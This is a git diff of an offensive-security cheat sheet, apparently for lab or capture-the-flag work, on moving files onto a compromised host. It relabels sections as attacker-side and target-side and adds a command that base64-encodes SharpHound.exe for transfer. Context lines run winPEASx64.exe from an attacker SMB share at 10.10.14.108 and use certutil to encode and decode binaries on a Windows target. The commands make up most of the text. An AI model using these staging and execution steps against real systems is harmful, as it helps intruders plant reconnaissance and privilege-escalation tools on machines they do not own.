@@ -40,17 +40,18 @@ Then `//10.10.14.108/share/winPEASx64.exe searchall cmd`
 `web.exe <PORT>`  
   
 ### Using base64 encoding:  
-Server-side (Linux)  
+Attacker-side (Linux). Newlines can be trimmed on Linux using `sed` or `tr`.     
 `base64 -w 0 <FILE> | xclip -selection clipboard`  
-  
-Server-side (Windows). Newlines can be trimmed on Linux using sed.  
+or `cat SharpHound.exe | base64 | tr -d '\n' > b64Sharphound.txt`  
+    
+Attacker-side (Windows). Newlines can be trimmed on Linux using `sed` or `tr`.  
 `certutil -encode <FILE> tmp_file_base64.txt`  
 `sed ':a;N;$!ba;s/\n//g' <FILE>`  
   
-Client-side - Linux  
+Target-side - Linux  
 `echo '<BASE64_FILECONTENT>' | base64 --decode > <OUTPUT_FILE>`  
   
-Client-side - Windows  
+Target-side - Windows  
 `echo <BASE64_FILECONTENT> > tmp_file_base64.txt`  
 `certutil -decode tmp_file_base64.txt <OUTPUT_FILE>`  
 `del tmp_file_base64.txt`  
